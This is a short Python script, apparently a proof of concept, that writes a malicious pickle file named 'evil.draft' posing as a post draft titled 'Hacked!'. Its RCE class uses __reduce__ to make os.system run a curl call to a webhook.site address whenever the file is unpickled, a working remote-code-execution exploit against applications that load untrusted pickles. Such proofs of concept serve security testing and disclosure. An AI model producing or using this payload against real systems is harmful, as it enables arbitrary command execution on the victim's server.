import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl https://webhook.site/011a51af-70a0-44fd-b8db-728e59646214',))

# Строим объект "черновика"
draft = {
    'title': 'Hacked!',
    'content': RCE()
}

with open('evil.draft', 'wb') as f:
    pickle.dump(draft, f)

